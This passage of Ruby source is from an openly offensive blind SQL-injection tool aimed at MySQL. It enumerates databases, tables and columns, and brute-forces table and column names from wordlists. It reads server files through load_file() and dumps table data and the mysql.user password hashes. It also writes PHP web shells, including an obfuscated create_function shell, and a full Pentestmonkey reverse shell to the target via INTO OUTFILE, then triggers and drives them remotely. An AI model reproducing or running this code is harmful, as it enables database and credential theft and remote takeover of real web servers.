      @target_config['DB_TABLES']['Current DB'] = @target_config['CDB_TABLES'] if @target_config['CURRENT_DB'].nil?
    end
  end

  # Get the Tables from the Database
  # Returns string of tablenames separated by space (for easy splitting later if need be)
  # Stores results into the db_tables Hash for tracking
  # Returns nil when nothing is found or problems are encounteredl
  def get_tables_db(db_name)
    if @target_config['VERSION'].scan(/./)[0].to_i >= 5
      # MySQL >= 5
      if not @target_config['DB_TABLES'].keys.include?(db_name)
        query = "select count(table_name) from information_schema.tables where table_schema=#{db_name.mysqlhex}"
        results = blind_basic_inject(query)
        if results.nil?
          print_error("Unable to determine number of tables in current database....")
          return nil
        else
          print_good("Fetching #{results} Tables from Current DB")
          tbls_count = results.to_i
        end
        tables=[]
        0.upto(tbls_count.to_i - 1).each do |zcount|
          results = blind_basic_inject("select table_name from information_schema.tables where table_schema=#{db_name.mysqlhex} limit #{zcount},1")
          pad = ' ' * (results.size + 25) unless results.nil? or results == ''
          pad = ' ' * 50 if results.nil? or results == ''
          print "\r(#{zcount})> #{results}#{pad}".cyan unless results == ''
          tables << results unless results == ''
        end
        print_line("")
        if tables.empty?
          print_error("Unable to get any tables from the current database!")
          print_error("Lack of privileges? IDK....")
          print_status("Possible Solutions include:")
          print_caution("A) Become HR's best friend by updating the code and sending him a copy")
          print_caution("B) Tweak Settings and try things again")
          print_caution("C) Be a bawz and do it manually")
          print_line("")
          return nil
        else	
          @target_config['DB_TABLES']["#{db_name}"] = tables
          print_good("DB: #{db_name}")
          print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
          return tables.join(' ')
        end
      else
        db = db_name
        tables = @target_config['DB_TABLES']["#{db_name}"].join(', ').sub(/, $/, '')
        print_good("DB: #{db}")
        print_good("Tables: #{tables}")
        return tables.join(' ')
      end
    elsif @target_config['VERSION'].scan(/./)[0].to_i < 5
      # MySQL < 5
      if not @target_config['DB_TABLES'].keys.include?(db_name)
        print_error("MySQL < 5: #{@target_config['VERSION']}")
        print_error("There is no information_schema to query for tables as result.....")
        if not @target_config['CURRENT_DB'].nil?
          print_error("Do you want to try Common Table Names (Y/N)?")
          answer = gets.chomp
          print_line("")
          if answer.upcase == 'Y' or answer.upcase == 'YES'
            tables = common_tables('CURRENT-DB', "#{HOME}fuzz/common_tables.lst")
            if tables.empty?
              print_error("OK, returning to menu...")
              return nil
            else
              print_good("DB: #{db_name}")
              print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
              @target_config['DB_TABLES']["#{db_name}"] = tables
              return tables.join(' ')
            end
          else
            print_error("OK, returning to menu...")
            return nil
          end
        else
          print_error("OK, returning to menu...")
          return nil
        end
      else
        db = db_name
        tables = @target_config['DB_TABLES']["#{db_name}"].join(', ').sub(/, $/, '')
        print_good("DB: #{db}")
        print_good("Tables: #{tables}")
      end
    end
  end

  # Common Tables Check
  # Bruteforce/Dictionary Attack
  def common_tables(db_name, fuzz_file)
    tables=[]
    fuzz_tables = File.open(fuzz_file).readlines
    print_status("Loaded #{fuzz_tables.size} table names from #{fuzz_file} into queue....")
    print_status("Starting Table Fuzzing against '#{db_name}'....")
    count=1
    fuzz_tables.each do |fuzzy|
      pad = '' * 20
      # Try to see if table exists using IF statement and REGEXP.....
      # http://ha.xxor.se/2011/06/speeding-up-blind-sql-injections-using.html
      ############################################################
      if db_name =~ /CURRENT-DB|database()|schema()/ #Brute against current active database
        regexp_table_check="SELECT 1 REGEXP IF((select count(*) from #{fuzzy.chomp}),1,'')"
      else
        regexp_table_check="SELECT 1 REGEXP IF((select count(*) from #{db_name}.#{fuzzy.chomp}),1,'')"
      end
      print "\r(".light_yellow + "#{count}".white + "/".light_yellow + "#{fuzz_tables.size}".white + ")>".light_yellow + " #{fuzzy.chomp}".cyan + pad
      if blind_true_false_inject(regexp_table_check)
        pd = ' ' * (100 + fuzzy.chomp.size)
        print "\r[".light_green + "*".white + "]".light_green + "the table '#{fuzzy.chomp}' appears to exist!".white + pd
        tables << fuzzy.chomp
      end
      count = count.to_i + 1
      ############################################################
    end
    @target_config['DB_TABLES']["#{db_name}"] = tables
    return tables
  end

  # Common Columns Check
  # Bruteforce/Dictionary Attack
  def common_columns(db_name, table_name, fuzz_file)
    columns=[]
    fuzz_columns = File.open(fuzz_file).readlines
    print_status("Loaded #{fuzz_columns.size} column names from #{fuzz_file} into queue....")
    if db_name =~ /CURRENT-DB|database()|schema()/
      print_status("Starting Column Fuzzing against #{table_name}....")
    else
      print_status("Starting Column Fuzzing against #{db_name}.#{table_name}....")
    end
    count = 1
    fuzz_columns.each do |fuzzy|
      pad = '' * 20
      if db_name =~ /CURRENT-DB|database()|schema()/ #Brute against current active database
        regexp_table_check="SELECT 1 REGEXP IF((select count(#{fuzzy.chomp}) from #{table_name}),1,'')"
      else
        regexp_table_check="SELECT 1 REGEXP IF((select count(#{fuzzy.chomp}) from #{db_name}.#{table_name.chomp}),1,'')"
      end
      print "\r(".light_yellow + "#{count}".white + "/".light_yellow + "#{fuzz_columns.size}".white + ")>".light_yellow + " #{fuzzy.chomp}".cyan + pad
      if blind_true_false_inject(regexp_table_check)
        pd = ' ' * (100 + fuzzy.chomp.size)
        print "\r[".light_green + "*".white + "]".light_green + "the column '#{fuzzy.chomp}' appears to exist!".white + pd
        columns << fuzzy.chomp
      end
      count = count.to_i + 1
    end
    # Not storing columns, maybe later when i figure out how to build directory tree based on results
    return columns
  end

  # Get Columns from Known Table
  def get_columns_table(db_name, table_name)
    if @target_config['VERSION'].scan(/./)[0].to_i < 5
      # MySQL < 5
      print_error("MySQL < 5: #{@target_config['VERSION']}")
      print_error("There is no information_schema to query for columns from known tables as result.....")
      print_error("Do you want to try Common Column Names (Y/N)?")
      answer = gets.chomp
      print_line("")
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        cols = common_columns(db_name, table_name, "#{HOME}fuzz/common_tables.lst")
        if cols.empty?
          print_error("OK, returning to menu...")
          return nil
        else
          print_good("DB: #{db_name}")
          print_good("Table: #{table_name}")
          print_good("Columns: #{cols.join(', ').sub(/, $/, '')}")
          return tables.join(' ')
        end
      else
        print_error("OK, returning to menu...")
        return nil
      end
    else
      # MySQL >= 5
      if db_name =~ /CURRENT-DB|database()|schema()/
        dbn = 'schema()' if db_name =~ /schema()/
        dbn = 'database()' unless db_name =~ /schema()/
      else
        dbn = db_name.mysqlhex
      end
      query = "select count(column_name) from information_schema.columns where table_schema=#{dbn} and table_name=#{table_name.mysqlhex}"
      results = blind_basic_inject(query)
      if results.nil?
        print_error("Unable to determine number of columns in #{table_name}....")
      else
        print_good("Fetching #{results} Columns for #{table_name}...")
      end
      columns=[]
      col_count = results.to_i
      0.upto(col_count.to_i - 1).each do |zcount|
        results = blind_basic_inject("select column_name from information_schema.columns where table_schema=#{dbn} and table_name=#{table_name.mysqlhex} limit #{zcount},1")
        pad = ' ' * (results.size + 25) unless results.nil? or results == ''
        pad = ' ' * 50 if results.nil? or results == ''
        print "\r(#{zcount})> #{results}#{pad}".cyan unless results == ''
        columns << results unless results == ''
      end
      print_line("")
      if columns.empty?
        print_error("Unable to get any columns for #{table_name}!")
        print_error("Lack of privileges? IDK....")
        print_status("Possible Solutions include:")
        print_caution("A) Become HR's best friend by updating the code and sending him a copy")
        print_caution("B) Tweak Settings and try things again")
        print_caution("C) Be a bawz and do it manually")
        print_line("")
      else	
        print_good("DB: #{db_name}")
        print_good("Table: #{table_name}")
        print_good("Columns: #{columns.join(', ').sub(/, $/, '')}")
      end
    end
  end

  # Try to Read Files off backend server
  # Requires privilged user access and ful path
  def read_file(file)
    results = blind_basic_inject("select CHAR_LENGTH(load_file(#{file.strip.chomp.mysqlhex}))")
    if results.nil? or results == ''
      print_line("")
      print_caution("Unable to determine size of #{file}....")
      max = 1000
    else
      max = results.to_i
    end
    data = ''
    count = 1
    complete = false
    while not complete 
      results = blind_basic_inject("select mid(load_file(#{file.strip.chomp.mysqlhex}), #{count},50)")
      count += 50
      if not results.nil? and not results == ''
        data += results.gsub('\x0A', "\n").gsub('\x09', "\n")
      else
        results = blind_basic_inject("select mid(load_file(#{file.strip.chomp.mysqlhex}), #{count},50)")
        count += 50
        if not results.nil? and not results == ''
          data += results.gsub('\x0A', "\n").gsub('\x09', "\n")
        else
          complete = true
        end
      end
      break if count > (max + 100)
    end
    if not data.nil? and not data == ''
      # Log Success for offline review
      logs = RESULTS + $config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
      logdir = logs + '/load_file/'
      logfile = logdir + file.gsub('/', '_').gsub('\\', '_').gsub(/[;:'",.~`!@#$\%^&*\(\)=\[\]]/, '_')
      Dir.mkdir(logs) unless File.exists?(logs)
      Dir.mkdir(logdir) unless File.exists?(logdir)
      f = File.open(logfile, 'w+')
      f.puts data
      f.close
      print_good("File: #{file}")
      print_status("#########################################################")
      print_line("#{data.chomp}")
      print_status("#########################################################")
      return true
    else
      print_line("")
      print_error("No results for: #{file}")
      return false
    end
  end

  # Pseudo Shell for Easy File Reading when you know what you want
  # Helpful when you want more than just 1-2 files in a row but not enough to fuzz...
  def read_file_shell
    while(true)
      prompt = "(MySQL_File_Reader)> "
      line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      if cmd =~ /^exit|^quit/i
        print_line("")
        print_error("OK, Returning to Main Menu...")
        break
      else
        read_file(cmd.strip)
        print_line("")
      end
    end
  end

  # LOAD_FILE() File Fuzzer
  # User provides file and we check for existance of content in response
  # Can run through all and display as found, or stop on success
  # Stop feature allows you to strategically bruteforce check for specific files leading to eventual manual mapping of filesystem
  def read_file_fuzz
    print_line("")
    while(true)
      print_caution("File to Fuzz with: ")
      file = gets.strip.chomp
      print_line("")
      if File.exists?(file)
        fuzz = File.open(file).readlines
        print_status("Loaded #{fuzz.size} fuzzies from #{file}....")
        print_caution("Do you want to Stop at First Success (Y/N)?")
        answer = gets.chomp
        if answer.upcase == 'Y' or answer.upcase == 'YES'
          stop = true
        else
          stop = false
        end
        break
      else
        print_error("Can't find or read provided file!")
        print_error("Check path or permissions and try again...")
        print_line("")
      end
    end
    print_status("Fuzzing Backend Files via load_file()....")
    if stop
      while(true)
        fuzz.each do |fuzzy|
          if blind_true_false_inject("SELECT 1 REGEXP IF((select CHAR_LENGTH(load_file(#{fuzzy.chomp.mysqlhex}))),1,'')")
            read_file(fuzzy.chomp)
            break
          end
        end
        break
      end
    else
      fuzz.each do |fuzzy|
        if blind_true_false_inject("SELECT 1 REGEXP IF((select CHAR_LENGTH(load_file(#{fuzzy.chomp.mysqlhex}))),1,'')")
          read_file(fuzzy.chomp)
        end
      end
    end
  end

  # Write Files to Target Server using SQLi
  # Requires privileged User
  # This gets the needed info then sends to file_write to finish job
  def file_writer_setup
    reverse = false
    simple = false
    while(true)
      print_caution("Select Payload Option: ")
      print_caution("1) Local File")
      print_caution("2) PHP CMD Shell")
      print_caution("3) PHP Reverse Shell")
      answer = gets.chomp
      print_line("")
      if answer.to_i > 0 and answer.to_i <= 3
        case answer.to_i
        when 1
          while(true)
            print_caution("Path to Local File: ")
            answer = gets.strip.chomp
            print_line("")
            if File.exists?(answer)
              payload = File.open(answer).read
              payload_filename = answer.split('/')[-1]
              break
            else
              print_error("Can't find or read provided file!")
              print_error("Check path or permissions and try again...")
              print_line("")
            end
          end
        when 2
          while(true)
            print_caution("Select PHP Shell Option: ")
            print_caution("1) Simple System($_GET['foo']) Shell")
            print_caution("2) Simple Eval(Base64($_REQUEST['foo'])) Shell")
            print_caution("3) Simple Passthru(Base64($_SERVER[HTTP_FOO])) Shell")
            print_caution("4) Simple Create_function(Base64($_SERVER[HTTP_FOO])) Shell")
            answer = gets.chomp
            print_line("")
            if answer.to_i > 0 and answer.to_i <= 4
              simple = true
              case answer.to_i
              when 1	
                simple_connect = 1
                payload = "<?error_reporting(0);print(___);system($_GET[foo]);print(___);die;?>"
              when 2
                simple_connect = 2
                payload = "<?error_reporting(0);print(___);eval(base64_decode($_REQUEST[foo]));print(___);die;?>"
              when 3
                simple_connect = 3
                payload = "<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_FOO]));print(___);die;?>"
              when 4
                simple_connect = 4
                payload = "<?error_reporting(0);print(___);$b=strrev(\"edoced_4\".\"6esab\");($var=create_function($var,$b($_SERVER[HTTP_FOO])))?$var():0;print(___);?>"
              end
              payload_filename = randz(8) + '.php'
              break
            else
              print_line("")
              print_error("Oops, Didn't quite understand that one")
              print_error("Please Choose a Valid Option From Menu Below Next Time.....")
              print_line("")
            end
          end
        when 3
          reverse = true
          print_caution("IP: ")
          ip = gets.chomp
          print_line("")
          print_caution("Port: ")
          port = gets.chomp
          print_line("")
          payload_filename = randz(8) + '.php'
          payload = "<?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '#{ip}'; $port = #{port.to_i}; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\"; } }; ?>" # Pentestmonkey's PHP Reverse Shell, Many THanks!
        end
        break
      else
        print_line("")
        print_error("Oops, Didn't quite understand that one")
        print_error("Please Choose a Valid Option From Menu Below Next Time.....")
        print_line("")
      end
    end
    while(true)
      print_caution("Writable Path Options: ")
      print_caution("1) Known Writable Path")
      print_caution("2) Fuzz w/Paths File")
      answer = gets.chomp
      if answer.to_i == 1
        print_caution("Remote Writable Path: ")
        answer = gets.strip.chomp
        if answer =~ /\/$/
          remote_paths = [ answer ]
        else
          remote_paths = [ "#{answer}/" ]
        end
        print_line("")
        break
      elsif answer.to_i == 2
        while(true)
          print_caution("Local File for Fuzzing Writable Path: ")
          answer = gets.strip.chomp
          print_line("")
          if File.exists?(answer.strip.chomp)
            paths = File.open(answer.strip.chomp).readlines
            remote_paths=[]
            paths.each { |x| remote_paths << x }
            break
          else
            print_error("Can't find or read provided file!")
            print_error("Check path or permissions and try again...")
            print_line("")
          end
        end
        break
      else
        print_line("")
        print_error("Oops, Didn't quite understand that one")
        print_error("Please Choose a Valid Option From Menu Below Next Time.....")
        print_line("")
      end
    end
    file_write(remote_paths, payload.mysqlhex, payload_filename)
    if reverse
      print_caution("URL to Trigger Reverse Shell: ")
      answer = gets.chomp
      print_line("")
      print_status("Trying to trigger reverse shell, make sure listener is ready...")
      sleep(3) # Dramatic pause to give a sec for listener prep
      res=@http.get(answer)
      if res[1] == 200
        print_good("200 Response Received!")
        print_good("Hopefully you caught a shell....")
      else
        print_error("Bad Response Received, not sure things went as planned. Sorry.....")
      end
    end
    if simple
      print_caution("Do you want to try and connect to Simple Shell (Y/N)?")
      answer = gets.chomp
      print_line("")
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        print_caution("URL to Shell (http://site.com/images/shellname.php): ")
        url = gets.chomp
        simple_shell(simple_connect.to_i, url)
      else
        print_status("OK, will leave it to you...")
        print_status("In case you were wondering, to connect via Curl: ")
        case simple_connect.to_i
        when 1
          print_line("SYSTEM SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_CMD_HERE>")
        when 2
          print_line("EVAL SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_BASE64_ENCODED_PHP-CMD_HERE>")
        when 3
          print_line("PASSTHRU HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_CMD_HERE>\"")
        when 4
          print_line("CREATE_FUNCTION EVAL HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_PHP-CMD_HERE>\"")
        end
      end
    end
  end

  # Assistant for connecting to shells we wrote
  def simple_shell(id, url)
    print_line("")
    prompt = "(CMD)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^exit|^quit/i
        print_line("")
        print_error("OK, exiting pseudo shell....")
        print_caution("In case you were wondering, to connect via Curl: ")
        case id
        when 1
          print_line("SYSTEM SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_CMD_HERE>")
        when 2
          print_line("EVAL SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_BASE64_ENCODED_PHP-CMD_HERE>")
        when 3
          print_line("PASSTHRU HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_CMD_HERE>\"")
        when 4
          print_line("CREATE_FUNCTION EVAL HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_PHP-CMD_HERE>\"")
        end
        print_error("Returning to Main Menu...")
        break
      else
        case id
        when 1
          link = url + "?foo=#{cmd.space2plus}"
        when 2
          code = Base64.encode64(cmd)
          link = url + "?foo=#{code.chomp}"
        when 3
          code = Base64.encode64(cmd)
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['HTTP']['HTTP_HEADERS'].store('FOO', code.chomp)
          link = url
        when 4
          code = Base64.encode64(cmd)
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['HTTP']['HTTP_HEADERS'].store('FOO', code.chomp)
          link = url
        end
        rez = @http.get(link)
        if rez[0] =~ /___(.+)/m
          res = $1.chomp
          if res != ''
            cmd_results = rez[0].split("__")[1]
            print_line("#{cmd_results.sub('_', '').chomp}") unless cmd_results.nil? or cmd_results == '_'
            print_line("") if cmd_results.nil? or cmd_results == '_'
            print_error("No Results Found in Output!") if cmd_results.nil? or cmd_results == '_'
            print_line("")
          else
            print_line("")
            print_error("No Results Found in Output!")
            print_line("")
          end
        else
          print_line("")
          print_error("No Results Found in Output!")
          print_line("")
        end
        $config['HTTP']['HTTP_HEADERS'].delete('FOO') if $config['HTTP']['HTTP_HEADERS'].keys.include?('FOO')
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
      end
    end
  end

  # Dump the Requested Column Data if we can
  # Logs Results to the Results Directory, in host folder
  # Save as TXT and CSV, /results/HOST/dbname_tblname.(txt||csv)
  def blind_data_dump(db_name, table_name, columns, start=0,stop=5)
    data=[] # WE will make an array of arrays to keep things trackable
    titlerow = []
    columns.each do |col|
      titlerow << col
    end
    data << titlerow
    start.to_i.upto(stop.to_i - 1).each do |zcount|
      row_data = []
      columns.each do |col|
        if db_name =~ /CURRENT-DB|database()|schema()/
          results = blind_basic_inject("select #{col} from #{table_name} limit #{zcount},1")
        else
          results = blind_basic_inject("select #{col} from #{db_name}.#{table_name} limit #{zcount},1")
        end
        if results.nil? or results == ''
          row_data << 'NULL'
        else
          row_data << results
        end
      end
      pad = ' ' * (row_data.size + 25) unless row_data.empty?
      pad = ' ' * 50 if row_data.empty?
      print "\r(ROW##{zcount})> #{row_data.join(',')}#{pad}".cyan unless row_data.empty?
      data << row_data unless row_data.empty?
    end
    print_line("")
    if data.size == 1
      print_error("Unable to dump any data for #{db_name}.#{table_name}:#{columns.join(', ').sub(/, $/, '')}!")
      print_error("Lack of privileges? IDK....")
      print_status("Possible Solutions include:")
      print_caution("A) Become HR's best friend by updating the code and sending him a copy")
      print_caution("B) Tweak Settings and try things again")
      print_caution("C) Be a bawz and do it manually")
      print_line("")
    else	
      print_good("DB: #{db_name}")
      print_good("Table: #{table_name}")
      print_good("Columns: #{columns.join(', ').sub(/, $/, '')}")
      pad = (data[0].size * 3) + data[0].size
      strsize = data[0].join().to_s.size
      breaker="\#" * (pad + strsize)
      print_good("#{breaker}")
      table = data.to_table(:first_row_is_head => true)
      print table.to_s.white
      print_good("#{breaker}")
      # Log Success for offline review
      logs = RESULTS + $config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
      logdir = logs + '/dumps/'
      file = "#{db_name}_#{table_name}".gsub('/', '_').gsub('\\', '_').gsub(/[;:'",.~`!@#$\%^&*\(\)=\[\]]/, '_')
      csvfile = logdir + file + '.csv'
      txtfile = logdir + file + '.txt'
      Dir.mkdir(logs) unless File.exists?(logs) and File.directory?(logs)
      Dir.mkdir(logdir) unless File.exists?(logdir) and File.directory?(logdir)
      CSV.open(csvfile, "wb") do |csv|
        data.each { |row| csv << row }
      end
      t = File.open(txtfile, 'w+')
      t.puts "DB: #{db_name}"
      t.puts "Table: #{table_name}"
      t.puts "Columns: #{columns.join(', ').sub(/, $/, '')}"
      t.puts ''
      t.puts table.to_s
      t.close
    end
  end

  # Dump the Users & Passwords if we can
  # Logs Results in table string form to the @passwords var for logging later
  # Returns true if success, false if fails
  def blind_password_dump
    columns=[ 'user', 'host', 'password', 'super_priv', 'file_priv', 'insert_priv', 'update_priv', 'Create_user_priv', 'create_priv', 'drop_priv', 'grant_priv' ]

    # Find out how many entries exist, or fail cause we dont have privs
    inj = "SELECT COUNT(#{columns[0]}) FROM mysql.user"
    results = blind_basic_inject(inj)
    if results.nil? or results == ''
      print_error("Unable to dump any passwords from mysql.user!")
      print_error("Lack of privileges? IDK....")
      print_status("Possible Solutions include:")
      print_caution("A) Become HR's best friend by updating the code and sending him a copy")
      print_caution("B) Tweak Settings and try things again")
      print_caution("C) Be a bawz and do it manually")
      print_line("")
      return false
    else
      entries = results.to_i
    end

    # Now go dump the passwords
    count = 0
    titlerow = []
    columns.each { |col| titlerow << col.sub('_priv', '') }
    data=[] # Array of Arrays for table later
    data << titlerow
    while count.to_i < entries.to_i
      row_data = []
      columns.each do |col|
        inj = "SELECT #{col} FROM mysql.user limit #{count},1"
        results = blind_basic_inject(inj)
        if results.nil? or results == ''
          row_data << 'NULL'
        else
          row_data << results
        end
      end
      pad = ' ' * (row_data.size + 25) unless row_data.empty?
      pad = ' ' * 50 if row_data.empty?
      print "\r(ROW##{count})> #{row_data.join(',')}#{pad}".cyan unless row_data.empty?
      data << row_data unless row_data.empty?
      count = count.to_i + 1
    end
    print_line("")
    if data.size == 1
      print_error("Unable to dump any passwords from mysql.user!")
      print_error("Lack of privileges? IDK....")
      print_status("Possible Solutions include:")
      print_caution("A) Become HR's best friend by updating the code and sending him a copy")
      print_caution("B) Tweak Settings and try things again")
      print_caution("C) Be a bawz and do it manually")
      print_line("")
      return false
    else	
      print_good("MySQL Users & Passwords: ")
      pad = (data[0].size * 3) + data[0].size
      strsize = data[0].join().to_s.size
      breaker="\#" * (pad + strsize)
      print_good("#{breaker}")
      table = data.to_table(:first_row_is_head => true)
      @target_config['PASSWORDS'] = table.to_s
      print_line("#{@target_config['PASSWORDS']}")
      print_good("#{breaker}")
      return true
    end
  end

  # Save basic injection info to file for proof & safe keeping
  def saveme
    logdir = RESULTS + $config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]
    file = logdir + "/boolean_blind-info.txt" if $config['INJECTOR']['MYSQL']['BLIND']['METHOD'] == 'BOOLEAN'
    file = logdir + "/regexp_blind-info.txt" if $config['INJECTOR']['MYSQL']['BLIND']['METHOD'] == 'REGXP'
    if File.exists?(file)
      # backup old copy and move out the way
    end
    Dir.mkdir(logdir) unless File.exists?(logdir) and File.directory?(logdir)
    f=File.open(file, 'w+')
    f.puts "Target: #{$config['INJECTOR']['MYSQL']['URL'].sub('http://', '').sub('https://', '').sub(/\/$/, '').split("/")[0]}\n"
    f.puts "Injection Point: #{$config['INJECTOR']['MYSQL']['LOC']}"
    f.puts "Method: Blind, #{$config['INJECTOR']['MYSQL']['BLIND']['METHOD']}\n\n"
    f.puts "GET: #{$config['INJECTOR']['MYSQL']['URL']}" if $config['INJECTOR']['MYSQL']['DATA'].nil? 
    f.puts "POST: #{$config['INJECTOR']['MYSQL']['URL']}" unless $config['INJECTOR']['MYSQL']['DATA'].nil? 
    f.puts "DATA: #{$config['INJECTOR']['MYSQL']['DATA']}" unless $config['INJECTOR']['MYSQL']['DATA'].nil? 
    case $config['INJECTOR']['MYSQL']['LOC']
    when 'UA'
      f.puts "User-Agent: #{$config['INJECTOR']['MYSQL']['UA']}"
    when 'REF'
      f.puts "Referer: #{$config['INJECTOR']['MYSQL']['REF']}"
    when 'HEADER'
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        f.puts "Header Name: #{k}"
        f.puts "Header Value: #{v}"
      end
    when 'COOKIE'
      $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
        f.puts "Cookie Name: #{k}"
        f.puts "Cookie Value: #{v}"
      end
    end
    f.puts "\n\nDBMS: MySQL"
    f.puts "Version: #{@target_config['VERSION']}" unless @target_config['VERSION'].nil?
    f.puts "Host: #{@target_config['HOST']}" unless @target_config['HOST'].nil?
    f.puts "User: #{@target_config['USER']}" unless @target_config['USER'].nil?
    f.puts "Basedir: #{@target_config['BASEDIR']}" unless @target_config['BASEDIR'].nil?
    f.puts "Datadir: #{@target_config['DATADIR']}" unless @target_config['DATADIR'].nil?
    f.puts "Tmpdir: #{@target_config['TMPDIR']}" unless @target_config['TMPDIR'].nil?
    f.puts "DB: #{@target_config['CURRENT_DB']}" unless @target_config['CURRENT_DB'].nil?
    f.puts "DBS: #{@target_config['DBS'].join(', ')}\n\n" unless @target_config['DBS'].empty?
    f.puts "\n\n" if @target_config['DBS'].empty?
    if not @target_config['PASSWORDS'].nil? or @target_config['PASSWORDS'].size != 0
      f.puts "MySQL Users & Passwords:"
      f.puts @target_config['PASSWORDS']
      f.puts "\n\n"
    end
    f.puts "Tables from #{@target_config['CURRENT_DB']}:\n#{@target_config['CDB_TABLES'].join(', ')}\n\n" unless @target_config['CDB_TABLES'].empty?
    if @target_config['DB_TABLES'].size > 1
      count=0
      @target_config['DB_TABLES'].each do |db, tables|
        if count.to_i > 1
          f.puts "Tables from #{db}:\n#{tables.join(', ')}\n\n" unless tables.empty?
        else
          count = count.to_i + 1 #Skip the placeholder foofuck entry....
        end
      end
    end
    f.close
    print_good("Basic info succesfully saved!")
    print_good("Saved to: #{file}")
  end

  # Actual File Writing
  def file_write(paths, payload, filename)
    while(true)
      paths.each do |path|
        writable = path.chomp + filename
        inj = "LIMIT 0,1 INTO OUTFILE '#{writable}' LINES TERMINATED BY #{payload}"
        t = @tweak.tamper(inj)
        t1 = @tweak.comma(t)
        injection_str = @tweak.space(t1)
        case $config['INJECTOR']['MYSQL']['LOC']
        when 'URL'
          if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
            injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.get(injection)
          else # POST
            injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.post(injection_url, injection_data)
          end
        when 'UA'
          original_ua = $config['HTTP']['HTTP_USER_AGENT']
          $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['HTTP_USER_AGENT'] = original_ua
        when 'REF'
          original_ref = $config['HTTP']['REFERER']
          $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['REFERER'] = original_ref
        when 'HEADER'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
